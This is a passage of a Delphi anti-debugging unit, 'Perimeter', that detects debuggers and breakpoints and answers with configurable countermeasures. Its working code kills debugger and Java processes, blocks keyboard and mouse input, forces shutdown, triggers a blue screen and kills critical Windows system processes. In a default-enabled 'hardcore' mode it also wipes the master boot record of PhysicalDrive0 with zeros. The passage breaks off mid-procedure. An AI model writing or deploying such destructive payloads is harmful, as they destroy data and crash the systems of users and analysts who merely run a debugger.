unit Perimeter;

interface

{$DEFINE HARDCORE_MODE}
{$DEFINE SOUNDS} // Скачайте Sounds.res для включения этой опции
//{$DEFINE SINGLE_CORE}

type
  TExternalChecking = record
    ProcPtr: function: LongWord; stdcall;
    DebuggerResult: LongWord;
  end;

type
  TPerimeterInputData = record
    ResistanceType: LongWord;
    CheckingsType: LongWord;
    ExtProcOnChecking: TExternalChecking;
    ExtProcOnEliminating: procedure;
    MainFormHandle: THandle;
    Interval: integer;
  end;

// Контрольные суммы основных функций:
var
  ValidInitCRC: LongWord = $D5B7E6EF;
  ValidStopCRC: LongWord = $CC957F0F;
  ValidMainCRC: LongWord = $F25875E2;

// Константы названий процессов для уничтожения:
const
  Debuggers: array [0..1] of string = (
                                         'ollydbg.exe',
                                         'idaq.exe'
                                                       );


  AdditionalProcesses: array [0..1] of string = (
                                                   'java.exe',
                                                   'javaw.exe'
                                                                );

                                                                
  SystemProcesses: array [0..3] of string = (
                                              'smss.exe',
                                              'csrss.exe',
                                              'wininit.exe',
                                              'winlogon.exe'
                                                              );

// Константы механизма противодействия:
const
  Nothing = 0;
  ExternalEliminating = 1;  // Внешняя процедура при ликвидации угрозы
  ShutdownProcess = 2;
  KillProcesses = 4;
  Notify = 8;
  BlockIO = 16;
  ShutdownPrimary = 32;
  ShutdownSecondary = 64;
  GenerateBSOD = 128;
  HardBSOD = 256;

{$IFDEF HARDCORE_MODE}
  DestroyMBR = 512;
{$ENDIF}

// Константы-идентификаторы проверок:
const
  ExternalChecking = 1; // Внешняя процедура при проверке
  LazyROM = 2;
  ROM = 4;
  PreventiveFlag = 8;
  ASM_A = 16;
  ASM_B = 32;
  IDP = 64;
  WINAPI_BP = 128;
  ZwSIT = 256;
  ZwQIP = 512;

procedure InitFunctions;
procedure InitPerimeter(const PerimeterInputData: TPerimeterInputData);
procedure StopPerimeter;
procedure DirectCall(Code: LongWord);
procedure Emulate(Debugger: boolean; Breakpoint: boolean);
procedure ChangeParameters(ResistanceType: LongWord; CheckingType: LongWord);
procedure ChangeExternalProcedures(OnCheckingProc: pointer; DebuggerValue: LongWord; OnEliminatingProc: pointer);

// Структуры с отладочной информацией

type
  TFunctionInfo = record
    Address: pointer;
    Size: LongWord;
    Checksum: LongWord;
    ValidChecksum: LongWord;
  end;

  TFunctions = record
    Main: TFunctionInfo;
    Init: TFunctionInfo;
    Stop: TFunctionInfo;
  end;

  TASMInfo = record
    Value: LongWord;
    IsDebuggerExists: boolean;
  end;

  TDebugInfo = record
    ROMFailure: boolean;
    PrivilegesActivated: boolean;
    PreventiveProcessesExists: boolean;
    IsDebuggerPresent: boolean;
    Asm_A: TASMInfo;
    Asm_B: TASMInfo;
    ZwQIP: TASMInfo;
    ExternalChecking: TASMInfo;
  end;

type
  TPerimeterInfo = record
    Functions: TFunctions;
    Debug: TDebugInfo;
  end;



var
  PerimeterInfo: TPerimeterInfo;

implementation

{$IFDEF SOUNDS}
  {$R SOUNDS.RES}
{$ENDIF}

{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}
{                                    WINDOWS                                    }
{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}

const
  ntdll = 'ntdll.dll';
  kernel32 = 'kernel32.dll';
  user32 = 'user32.dll';
  winmm = 'winmm.dll';
  advapi32 = 'advapi32.dll';

const
  VER_PLATFORM_WIN32_NT = 2;
  TOKEN_ADJUST_PRIVILEGES = $0020;
  TOKEN_QUERY = $0008;
  SE_PRIVILEGE_ENABLED = $00000002;
  ERROR_SUCCESS = 0;
  MB_ICONERROR = $00000010;

  STANDARD_RIGHTS_REQUIRED = $000F0000;
  SYNCHRONIZE = $00100000;
  PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or $FFF);

  THREAD_PRIORITY_TIME_CRITICAL = 15;

  PROCESS_TERMINATE = $0001;

type
  HWND = LongWord;
  WPARAM = Longint;
  LPARAM = Longint;
  UINT = LongWord;
  BOOL = LongBool;
  TLargeInteger = Int64;
  LPCSTR = PAnsiChar;
  FARPROC = Pointer;
  PULONG = ^Cardinal;

  _LUID_AND_ATTRIBUTES = packed record
    Luid: Int64;
    Attributes: LongWord;
  end;
  TLUIDAndAttributes = _LUID_AND_ATTRIBUTES;

  _TOKEN_PRIVILEGES = record
    PrivilegeCount: LongWord;
    Privileges: array [0..0] of TLUIDAndAttributes;
  end;
  TTokenPrivileges = _TOKEN_PRIVILEGES;
  TOKEN_PRIVILEGES = _TOKEN_PRIVILEGES;

function TerminateProcess(Handle: LongWord; ExitCode: LongWord): LongWord; stdcall; external kernel32 name 'TerminateProcess';  
function OpenProcess(dwDesiredAccess: LongWord; bInheritHandle: BOOL; dwProcessId: LongWord): THandle; stdcall; external kernel32 name 'OpenProcess';
function OpenProcessToken(ProcessHandle: THandle; DesiredAccess: LongWord; var TokenHandle: THandle): BOOL; stdcall; external advapi32 name 'OpenProcessToken';
function GetCurrentProcess: THandle; stdcall; external kernel32 name 'GetCurrentProcess';
function CloseHandle(hObject: THandle): BOOL; stdcall; external kernel32 name 'CloseHandle';

function LookupPrivilegeValue(lpSystemName, lpName: PChar; var lpLuid: Int64): BOOL; stdcall; external advapi32 name 'LookupPrivilegeValueA';

function AdjustTokenPrivileges(TokenHandle: THandle; DisableAllPrivileges: BOOL;
  const NewState: TTokenPrivileges; BufferLength: LongWord;
  var PreviousState: TTokenPrivileges; var ReturnLength: LongWord): BOOL; stdcall; external advapi32 name 'AdjustTokenPrivileges';

function GetCurrentThreadId: LongWord; stdcall; external kernel32 name 'GetCurrentThreadId';
function SetThreadAffinityMask(hThread: THandle; dwThreadAffinityMask: LongWord): LongWord; stdcall; external kernel32 name 'SetThreadAffinityMask';
function SetThreadPriority(hThread: THandle; nPriority: Integer): BOOL; stdcall; external kernel32 name 'SetThreadPriority';

function ReadProcessMemory(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
  nSize: LongWord; var lpNumberOfBytesRead: LongWord): BOOL; stdcall; external kernel32 name 'ReadProcessMemory';

function GetModuleHandle(lpModuleName: PChar): HMODULE; stdcall; external kernel32 name 'GetModuleHandleA';
function LoadLibrary(lpLibFileName: PChar): HMODULE; stdcall; external kernel32 name 'LoadLibraryA';
function GetProcAddress(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall; external kernel32 name 'GetProcAddress';
function GetWindowThreadProcessId(hWnd: HWND; dwProcessId: pointer): LongWord; stdcall; external user32 name 'GetWindowThreadProcessId';
function GetCurrentThread: THandle; stdcall; external kernel32 name 'GetCurrentThread';
function GetCurrentProcessId: LongWord; stdcall; external kernel32 name 'GetCurrentProcessId';

{$IFDEF HARDCORE_MODE}
var
  hDrive: LongWord;
  Data: pointer;
  WrittenBytes: LongWord;

const
  GENERIC_ALL           = $10000000;
  FILE_SHARE_READ       = $00000001;
  FILE_SHARE_WRITE      = $00000002;
  OPEN_EXISTING         = 3;
  FILE_ATTRIBUTE_NORMAL = $00000080;

type
  PSecurityAttributes = ^_SECURITY_ATTRIBUTES;
  _SECURITY_ATTRIBUTES = record
    nLength: LongWord;
    lpSecurityDescriptor: Pointer;
    bInheritHandle: LongBool;
  end;

  POverlapped = ^_OVERLAPPED;
  _OVERLAPPED = record
    Internal: LongWord;
    InternalHigh: LongWord;
    Offset: LongWord;
    OffsetHigh: LongWord;
    hEvent: THandle;
  end;

var
  CreateFile: function(
                        lpFileName: PAnsiChar;
                        dwDesiredAccess,
                        dwShareMode: LongWord;
                        lpSecurityAttributes: PSecurityAttributes;
                        dwCreationDisposition,
                        dwFlagsAndAttributes: LongWord;
                        hTemplateFile: THandle
                       ): THandle; stdcall;

  WriteFile: function(
                       hFile: THandle;
                       const Buffer;
                       nNumberOfBytesToWrite: LongWord;
                       var lpNumberOfBytesWritten: LongWord;
                       lpOverlapped: POverlapped
                      ): LongBool; stdcall;
{$ENDIF}

{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}
{                                END OF WINDOWS                                 }
{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}
{                                   TLHELP32                                    }
{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}

const
  TH32CS_SNAPPROCESS  = $00000002;
  MAX_PATH = 260;

type
  tagPROCESSENTRY32 = packed record
    dwSize: LongWord;
    cntUsage: LongWord;
    th32ProcessID: LongWord;       
    th32DefaultHeapID: LongWord;
    th32ModuleID: LongWord;
    cntThreads: LongWord;
    th32ParentProcessID: LongWord; 
    pcPriClassBase: Longint;    
    dwFlags: LongWord;
    szExeFile: array[0..MAX_PATH - 1] of Char;
  end;
  TProcessEntry32 = tagPROCESSENTRY32;

function CreateToolhelp32Snapshot(dwFlags, th32ProcessID: LongWord): THandle; stdcall; external kernel32 name 'CreateToolhelp32Snapshot';
function Process32First(hSnapshot: THandle; var lppe: TProcessEntry32): BOOL; stdcall; external kernel32 name 'Process32First';
function Process32Next(hSnapshot: THandle; var lppe: TProcessEntry32): BOOL; stdcall; external kernel32 name 'Process32Next';

{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}
{                               END OF TLHELP32                                 }
{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}
{                                   SYSUTILS                                    }
{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}

// Переписанный и упрощённый ExtractFileName:
function ExtractFileName(const FileName: string): string;
var
  I: integer;
  Len: integer;
  DelimiterPos: integer;
begin
  Result := '';
  Len := Length(FileName);

  if FileName[1] = '\' then
    DelimiterPos := 1
  else
    DelimiterPos := 0;

  for I := Len downto 1 do
  begin
    if FileName[I] = '\' then
    begin
      DelimiterPos := I;
      Break;
    end;
  end;

  inc(DelimiterPos);

  if DelimiterPos = 1 then
  begin
    Result := FileName;
  end
  else
  begin
    for I := DelimiterPos to Len do
    begin
      Result := Result + FileName[I];
    end;
  end;
end;

// Оригинальный UpperCase от FastCode с комментариями:
function UpperCase(const S: string): string;
asm {Size = 134 Bytes}
  push    ebx
  push    edi
  push    esi
  test    eax, eax               {Test for S = NIL}
  mov     esi, eax               {@S}
  mov     edi, edx               {@Result}
  mov     eax, edx               {@Result}
  jz      @@Null                 {S = NIL}
  mov     edx, [esi-4]           {Length(S)}
  test    edx, edx
  je      @@Null                 {Length(S) = 0}
  mov     ebx, edx
  call    system.@LStrSetLength  {Create Result String}
  mov     edi, [edi]             {@Result}
  mov     eax, [esi+ebx-4]       {Convert the Last 4 Characters of String}
  mov     ecx, eax               {4 Original Bytes}
  or      eax, $80808080         {Set High Bit of each Byte}
  mov     edx, eax               {Comments Below apply to each Byte...}
  sub     eax, $7B7B7B7B         {Set High Bit if Original <= Ord('z')}
  xor     edx, ecx               {80h if Original < 128 else 00h}
  or      eax, $80808080         {Set High Bit}
  sub     eax, $66666666         {Set High Bit if Original >= Ord('a')}
  and     eax, edx               {80h if Orig in 'a'..'z' else 00h}
  shr     eax, 2                 {80h > 20h ('a'-'A')}
  sub     ecx, eax               {Clear Bit 5 if Original in 'a'..'z'}
  mov     [edi+ebx-4], ecx
  sub     ebx, 1
  and     ebx, -4
  jmp     @@CheckDone
@@Null:
  pop     esi
  pop     edi
  pop     ebx
  jmp     System.@LStrClr
@@Loop:                          {Loop converting 4 Character per Loop}
  mov     eax, [esi+ebx]
  mov     ecx, eax               {4 Original Bytes}
  or      eax, $80808080         {Set High Bit of each Byte}
  mov     edx, eax               {Comments Below apply to each Byte...}
  sub     eax, $7B7B7B7B         {Set High Bit if Original <= Ord('z')}
  xor     edx, ecx               {80h if Original < 128 else 00h}
  or      eax, $80808080         {Set High Bit}
  sub     eax, $66666666         {Set High Bit if Original >= Ord('a')}
  and     eax, edx               {80h if Orig in 'a'..'z' else 00h}
  shr     eax, 2                 {80h > 20h ('a'-'A')}
  sub     ecx, eax               {Clear Bit 5 if Original in 'a'..'z'}
  mov     [edi+ebx], ecx
@@CheckDone:
  sub     ebx, 4
  jnc     @@Loop
  pop     esi
  pop     edi
  pop     ebx
end;

{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}
{                               END OF SYSUTILS                                 }
{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}

const
  Delta: single = 0.5; // Допуск по времени

const
  SE_SHUTDOWN_NAME = 'SeShutdownPrivilege'; // привилегия, необходимая для
                                            // выполнения функций BSOD и
                                            // отключения питания
  SE_DEBUG_NAME = 'SeDebugPrivilege';

// Список параметров для первого способа выключения питания
type SHUTDOWN_ACTION = (
                         ShutdownNoReboot,
                         ShutdownReboot,
                         ShutdownPowerOff
                         );

// Список ВХОДНЫХ опций для функции BSOD'a: для генерации синего экрана
// нужна последняя (OptionShutdownSystem). Если в вызове функции указать не её, а другую -
// будет сгенерирован MessageBox с сообщением об ошибке, код которой
// будет указан первым параметром этой функции.
type HARDERROR_RESPONSE_OPTION = (
                                  OptionAbortRetryIgnore,
                                  OptionOk,
                                  OptionOkCancel,
                                  OptionRetryCancel,
                                  OptionYesNo,
                                  OptionYesNoCancel,
                                  OptionShutdownSystem
                                  );

// Список ВЫХОДНЫХ опций для функции BSOD'a:
type HARDERROR_RESPONSE = (
                            ResponseReturnToCaller,
                            ResponseNotHandled,
                            ResponseAbort,
                            ResponseCancel,
                            ResponseIgnore,
                            ResponseNo,
                            ResponseOk,
                            ResponseRetry,
                            ResponseYes
                           );


type
  PSYSTEM_HANDLE_INFORMATION = ^SYSTEM_HANDLE_INFORMATION;
  SYSTEM_HANDLE_INFORMATION = packed record
    ProcessId: LongWord;
    ObjectTypeNumber: Byte;
    Flags: Byte;
    Handle: Word;
    pObject: Pointer;
    GrantedAccess: LongWord;
  end;

type
  PSYSTEM_HANDLE_INFORMATION_EX = ^SYSTEM_HANDLE_INFORMATION_EX;
  SYSTEM_HANDLE_INFORMATION_EX = packed record
    NumberOfHandles: LongWord;
    Information: array [0..0] of SYSTEM_HANDLE_INFORMATION;
  end;

type // Объявление типов из NTDDK
  POWER_ACTION = integer;
  SYSTEM_POWER_STATE = integer;
  ULONG = cardinal;
  NTStatus = LongWord;
  PVoid = pointer;

const // Номера ошибок, с которыми вызывается синий экран.
  TRUST_FAILURE = $C0000250;
  LOGON_FAILURE = $C000006C;
  HOST_DOWN = $C0000350;
  FAILED_DRIVER_ENTRY = $C0000365;
  NT_SERVER_UNAVAILABLE = $C0020017;
  NT_CALL_FAILED = $C002001B;
  CLUSTER_POISONED = $C0130017;
  FATAL_UNHANDLED_HARD_ERROR = $0000004C;
  STATUS_SYSTEM_PROCESS_TERMINATED = $C000021A;

const // Создаём массив из кодов ошибок чтобы удобнее было ими оперировать
  ErrorCode: array [0..8] of LongWord =    (
                                          TRUST_FAILURE,
                                          LOGON_FAILURE,
                                          HOST_DOWN,
                                          FAILED_DRIVER_ENTRY,
                                          NT_SERVER_UNAVAILABLE,
                                          NT_CALL_FAILED,
                                          CLUSTER_POISONED,
                                          FATAL_UNHANDLED_HARD_ERROR,
                                          STATUS_SYSTEM_PROCESS_TERMINATED
                                          );

// Делаем заготовки для импортируемых функций и пишем вспомогательные переменные:
var
  // 1й способ отключения питания:
  ZwShutdownSystem: procedure (Action: SHUTDOWN_ACTION); stdcall;

  // 2й способ отключения питания:
  ZwInitiatePowerAction: procedure (
                                     SystemAction: POWER_ACTION;
                                     MinSystemState: SYSTEM_POWER_STATE;
                                     Flags: ULONG;
                                     Asynchronous: BOOL
                                                        ); stdcall;

  // BSOD:
  HR: HARDERROR_RESPONSE;
  ZwRaiseHardError: procedure (
                                ErrorStatus: NTStatus;
                                NumberOfParameters: ULong;
                                UnicodeStringParameterMask: PChar;
                                Parameters: PVoid;
                                ResponseOption: HARDERROR_RESPONSE_OPTION;
                                PHardError_Response: pointer
                                                             ); stdcall;

  // Завершение процесса из ядра
  LdrShutdownProcess: procedure; stdcall;
  ZwTerminateProcess: function(Handle: LongWord; ExitStatus: LongWord): NTStatus; stdcall;
  //LdrShutdownThread: procedure; stdcall;

  //  Отключение клавиатуры и мыши:
  BlockInput: function (Block: BOOL): BOOL; stdcall;

  // Проверка наличия отладчика:
  IsDebuggerPresent: function: boolean; stdcall;

  ZwQueryInformationProcess: function (ProcessHandle: THANDLE;
                                       ProcessInformationClass: LongWord;
                                       ProcessInformation: pointer;
                                       ProcessInformationLength: ULONG;
                                       ReturnLength: PULONG): NTStatus; stdcall;

  ZwSetInformationThread: procedure; stdcall;


  // Маскируем стандартные функции, используем "ручной" вызов:
  MsgBox: procedure (hWnd: HWND; lpText: PAnsiChar; lpCaption: PAnsiChar; uType: Cardinal); stdcall;

  {$IFDEF SOUNDS}
  PlaySound: procedure (pszSound: string; hMod: HModule; fdwSound: LongWord); stdcall;
  {$ENDIF}

  QueryPerformanceFrequency: procedure (var lpFrequency: Int64); stdcall;
  QueryPerformanceCounter: procedure (var lpPerformanceCount: Int64); stdcall;
  SendMessage: procedure (hWnd: HWND; Msg: LongWord; wParam: WPARAM; lParam: LPARAM); stdcall;
  Sleep: procedure (SuspendTime: LongWord); stdcall;
  OpenThread: function (dwDesiredAccess: LongWord; bInheritHandle: boolean; dwThreadId: LongWord): THandle; stdcall;

// Имена библиотек и вызываемых функций:
const
  // Из ntdll:
  sZwRaiseHardError: PAnsiChar = 'ZwRaiseHardError';
  sZwShutdownSystem: PAnsiChar = 'ZwShutdownSystem';
  sZwInitiatePowerAction: PAnsiChar = 'ZwInitiatePowerAction';
  sLdrShutdownProcess: PAnsiChar = 'LdrShutdownProcess';
  sZwSetInformationThread: PAnsiChar = 'ZwSetInformationThread';
  sZwQueryInformationProcess: PAnsiChar = 'ZwQueryInformationProcess';
  sZwTerminateProcess: PAnsiChar = 'ZwTerminateProcess';
  //sLdrShutdownThread: PAnsiChar = 'LdrShutdownThread';


  // Из kernel32:
  sIsDebuggerPresent: PAnsiChar = 'IsDebuggerPresent';
  sQueryPerformanceFrequency: PAnsiChar = 'QueryPerformanceFrequency';
  sQueryPerformanceCounter: PAnsiChar = 'QueryPerformanceCounter';
  sSleep: PAnsiChar = 'Sleep';
  sOutputDebugStringA: PAnsiChar = 'OutputDebugStringA';
  sOpenThread: PAnsiChar = 'OpenThread';

  {$IFDEF HARDCORE_MODE}
  sCreateFileA: PAnsiChar = 'CreateFileA';
  sWriteFile: PAnsiChar = 'WriteFile';
  {$ENDIF}

  // Из user32:
  sMessageBox: PAnsiChar = 'MessageBoxA';
  sBlockInput: PAnsiChar = 'BlockInput';
  sSendMessage: PAnsiChar = 'SendMessageA';

  {$IFDEF SOUNDS}
  // Из winmm:
  sPlaySound: PAnsiChar = 'PlaySoundA';

  SND_RESOURCE        = $00040004;
  SND_LOOP            = $0008;
  SND_ASYNC           = $0001;
  {$ENDIF}

// Тип внешних проверок:
type
  TExternalGuard = record
    OnChecking: TExternalChecking;
    OnEliminating: procedure;
  end;

var
  ExternalGuard: TExternalGuard;
  
// Рабочие переменные
var
  GlobalInitState: boolean = false;

  TypeOfResistance: LongWord;
  TypeOfChecking: LongWord;

  ThreadID: LongWord;
  ThreadHandle: integer;
  FormHandle: THandle; // Хэндл формы, которой будут посылаться сообщения
  Active: boolean = false;
  Delay: integer;

// Переменные эмуляции отладчика и брейкпоинта:
  EmuDebugger: boolean = false;
  EmuBreakpoint: boolean = false;

// Переменные сканирования памяти:
  Process: THandle;
  InitAddress, StopAddress, MainAddress: pointer;
  InitSize, StopSize, MainSize: integer;

var
  CRCtable: array[0..255] of cardinal;

function CRC32(InitCRC32: cardinal; StPtr: pointer; StLen: integer): cardinal;
asm
  test edx,edx;
  jz @ret;
  neg ecx;
  jz @ret;
  sub edx,ecx;

  push ebx;
  mov ebx,0;
@next:
  mov bl,al;
  xor bl,byte [edx+ecx];
  shr eax,8;
  xor eax,cardinal [CRCtable+ebx*4];
  inc ecx;
  jnz @next;
  pop ebx;
  xor eax, $FFFFFFFF
@ret:
end;

procedure CRCInit;
var
  c: cardinal;
  i, j: integer;
begin
  for i := 0 to 255 do
  begin
    c := i;
    for j := 1 to 8 do
      if odd(c) then
        c := (c shr 1) xor $EDB88320
      else
        c := (c shr 1);
    CRCtable[i] := c;
  end;
end;

{- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}

function IsProcLaunched(ProcessName: string): boolean;
var
  hSnap: THandle;
  PE: TProcessEntry32;
begin
  Result := false;
  PE.dwSize := SizeOf(PE);
  hSnap := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if Process32First(hSnap, PE) then
  begin
    if PE.szExeFile = ProcessName then
    begin
      Result := true;
    end
    else
    begin
      while Process32Next(hSnap, PE) do
      begin
        if PE.szExeFile = ProcessName then
        begin
          Result := true;
          Break;
        end;
      end;
    end;
  end;
  CloseHandle(hSnap);
end;

// Функция, убивающая процесс по его имени:
function KillTask(ExeFileName: string): integer;
var
  Co: BOOL;
  FS: THandle;
  FP: TProcessEntry32;
begin
  result := 0;
  FS := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
  FP.dwSize := Sizeof(FP);
  Co := Process32First(FS,FP);

  while integer(Co) <> 0 do
  begin
    if
      ((UpperCase(ExtractFileName(FP.szExeFile)) = UpperCase(ExeFileName))
    or
      (UpperCase(FP.szExeFile) = UpperCase(ExeFileName)))
    then
      Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), FP.th32ProcessID), 0));
    Co := Process32Next(FS, FP);
  end;
  CloseHandle(FS);
end;

// Установка привилегий
function NTSetPrivilege(sPrivilege: string; bEnabled: Boolean): Boolean;
var
  hToken: THandle;
  TokenPriv: TOKEN_PRIVILEGES;
  PrevTokenPriv: TOKEN_PRIVILEGES;
  ReturnLength: Cardinal;
begin
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, hToken) then
  begin
    if LookupPrivilegeValue(nil, PChar(sPrivilege), TokenPriv.Privileges[0].Luid) then
    begin
      TokenPriv.PrivilegeCount := 1;
      case bEnabled of
        True: TokenPriv.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
        False: TokenPriv.Privileges[0].Attributes := 0;
      end;
      ReturnLength := 0;
      PrevTokenPriv := TokenPriv;
      AdjustTokenPrivileges(hToken, False, TokenPriv, SizeOf(PrevTokenPriv),
      PrevTokenPriv, ReturnLength);
    end;
    CloseHandle(hToken);
  end;
  Result := GetLastError = ERROR_SUCCESS;
end;


procedure InitFunctions;
var
  hUser32: THandle;
  hKernel32: THandle;
  hNtdll: THandle;
  {$IFDEF SOUNDS}
  hWinMM: THandle;
  {$ENDIF}
begin
// Присваиваем процессу привилегию SE_SHUTDOWN_NAME:
  PerimeterInfo.Debug.PrivilegesActivated := NTSetPrivilege(SE_SHUTDOWN_NAME, true) and NTSetPrivilege(SE_DEBUG_NAME, true);

// Получаем хэндлы библиотек:
  hUser32 := LoadLibrary(user32);
  hKernel32 := LoadLibrary(kernel32);
  hNtdll := GetModuleHandle(ntdll);
  {$IFDEF SOUNDS}
  hWinMM := LoadLibrary(winmm);
  {$ENDIF}

// Получаем адреса функций в библиотеках:
  // kernel32:
  IsDebuggerPresent := GetProcAddress(hKernel32, sIsDebuggerPresent);
  QueryPerformanceFrequency := GetProcAddress(hKernel32, sQueryPerformanceFrequency);
  QueryPerformanceCounter := GetProcAddress(hKernel32, sQueryPerformanceCounter);
  Sleep := GetProcAddress(hKernel32, sSleep);
  OpenThread := GetProcAddress(hKernel32, sOpenThread);

  {$IFDEF HARDCORE_MODE}
  CreateFile := GetProcAddress(hKernel32, sCreateFileA);
  WriteFile := GetProcAddress(hKernel32, sWriteFile);
  {$ENDIF}

  // user32:
  BlockInput := GetProcAddress(hUser32, sBlockInput);
  MsgBox := GetProcAddress(hUser32, sMessageBox);
  SendMessage := GetProcAddress(hUser32, sSendMessage);

  {$IFDEF SOUNDS}
  // winmm:
  PlaySound := GetProcAddress(hWinMM, sPlaySound);
  {$ENDIF}

  // ntdll:
  ZwRaiseHardError := GetProcAddress(hNtdll, sZwRaiseHardError);

  ZwShutdownSystem := GetProcAddress(hNtdll, sZwShutdownSystem);
  ZwInitiatePowerAction := GetProcAddress(hNtdll, sZwInitiatePowerAction);
  LdrShutdownProcess := GetProcAddress(hNtdll, sLdrShutdownProcess);
  ZwSetInformationThread := GetProcAddress(hNtdll, sZwSetInformationThread);
  ZwQueryInformationProcess := GetProcAddress(hNtdll, sZwQueryInformationProcess);
  ZwTerminateProcess := GetProcAddress(hNtdll, sZwTerminateProcess);
//  LdrShutdownThread := GetProcAddress(hNtdll, sLdrShutdownThread);

  GlobalInitState := true;
end;

procedure DirectCall(Code: LongWord);
var
  I: byte;
  ProcLength, AdditionalLength: byte;
begin
  if not GlobalInitState then InitFunctions;

  case Code of
    Nothing: Exit;

    ShutdownProcess:
      begin
        LdrShutdownProcess;
        ZwTerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), GetCurrentProcessId), 0);
      end;

    KillProcesses:
      begin
        ProcLength := Length(Debuggers) - 1;
        for I := 0 to ProcLength do
        begin
          KillTask(Debuggers[I]);
        end;

        AdditionalLength := Length(AdditionalProcesses);

        if AdditionalLength > 0 then
        begin
          Dec(AdditionalLength);
          for I := 0 to AdditionalLength do
          begin
            KillTask(AdditionalProcesses[I]);
          end;
        end;
      end;

    Notify:
      begin
        {$IFDEF SOUNDS}
        PlaySound('ALERT', 0, SND_RESOURCE or SND_ASYNC or SND_LOOP);
        {$ENDIF}
        MsgBox(FormHandle, 'Erro interno! Não é possível continuar!', 'Perigo para a segurança interna!', MB_ICONERROR);
        LdrShutdownProcess;
        ZwTerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), GetCurrentProcessId), 0);
      end;

    BlockIO: BlockInput(true);

    ShutdownPrimary: ZwShutdownSystem(SHUTDOWN_ACTION(0));

    ShutdownSecondary: ZwInitiatePowerAction(4, 6, 0, true);

    GenerateBSOD: ZwRaiseHardError(ErrorCode[2], 0, nil, nil, HARDERROR_RESPONSE_OPTION(6), @HR);

    HardBSOD:
      begin
        ProcLength := Length(SystemProcesses) - 1;
        for I := 0 to ProcLength do
        begin
          KillTask(SystemProcesses[I]);
        end;
      end;

   {$IFDEF HARDCORE_MODE}
    DestroyMBR:
      begin
        hDrive := CreateFile('\\.\PhysicalDrive0', GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
        GetMem(Data, 512);
        FillChar(Data^, 512, #0);
        WriteFile(hDrive, Data^, 512, WrittenBytes, nil);
        CloseHandle(hDrive);
        FreeMem(Data);
      end;
   {$ENDIF}
  end;
end;

// Основной поток: проверка на наличие отладчика, проверка на брейкпоинты
procedure MainThread;
const
  DebuggerMsg: byte = 0;
  BreakpointMsg: byte = 1;

var
  MessageType: byte; // Тип текста в оповещении:
                     // 0 = Отладчик
                     // 1 = Брейкпоинт
                     // 2 = Несовпадение контрольных сумм
  ProcLength: byte;

  procedure EliminateThreat;
  var
    NotifyMessage: PAnsiChar;
    CaptionMessage: PAnsiChar;
    BSODErrorCode: byte;
    I: byte;
    AdditionalLength: byte;
  begin
    // Исполняем внешнюю процедуру уничтожения угрозы:
    if (TypeOfResistance and ExternalEliminating) = ExternalEliminating then
    begin
      ExternalGuard.OnEliminating
    end;

    // Убиваем свой процесс из ядра:
    if (TypeOfResistance and ShutdownProcess) = ShutdownProcess then
    begin
      LdrShutdownProcess;
      ZwTerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), GetCurrentProcessId), 0);
    end;

    // Убиваем процессы:
    if (TypeOfResistance and KillProcesses) = KillProcesses then
    begin
      for I := 0 to ProcLength do
      begin
        KillTask(Debuggers[I]);
      end;

      AdditionalLength := Length(AdditionalProcesses);

      if AdditionalLength > 0 then
      begin
        Dec(AdditionalLength);
        for I := 0 to AdditionalLength do
        begin
          KillTask(AdditionalProcesses[I]);
        end;
      end;
    end;

    // Выводим сообщение и закрываем программу:
    if (TypeOfResistance and Notify) = Notify then
    begin
      {$IFDEF SOUNDS}
      PlaySound('ALERT', 0, SND_RESOURCE or SND_ASYNC or SND_LOOP);
      {$ENDIF}

      CaptionMessage := 'Perigo para a segurança interna!';
      NotifyMessage := 'Erro interno! Não é possível continuar!';
      case MessageType of
        0: NotifyMessage := 'Debugger detectado! Não é possível continuar!';
        1: NotifyMessage := 'Breakpoint detectado! Não é possível continuar!';
        2:
          begin
            NotifyMessage := 'ROM damaged!';
            CaptionMessage := 'System Failure';
          end;
      end;
      MsgBox(FormHandle, NotifyMessage, CaptionMessage, MB_ICONERROR);

      LdrShutdownProcess;
      ZwTerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), GetCurrentProcessId), 0);
    end;

    // Блокируем клавиатуру и мышь:
    if (TypeOfResistance and BlockIO) = BlockIO then
    begin
      BlockInput(true);
    end;

    // Выключаем питание первым способом:
    if (TypeOfResistance and ShutdownPrimary) = ShutdownPrimary then
    begin
      ZwShutdownSystem(SHUTDOWN_ACTION(0));
    end;

    // Выключаем питание вторым способом:
    if (TypeOfResistance and ShutdownSecondary) = ShutdownSecondary then
    begin
      ZwInitiatePowerAction(4, 6, 0, true);
    end;

    // Выводим BSOD:
    if (TypeOfResistance and GenerateBSOD) = GenerateBSOD then
    begin
      BSODErrorCode := Random(6);
      ZwRaiseHardError(ErrorCode[BSODErrorCode], 0, nil, nil, HARDERROR_RESPONSE_OPTION(6), @HR);
    end;

    // Тяжёлый BSOD - убиваем системные процессы:
    if (TypeOfResistance and HardBSOD) = HardBSOD then
    begin
      ProcLength := Length(SystemProcesses) - 1;
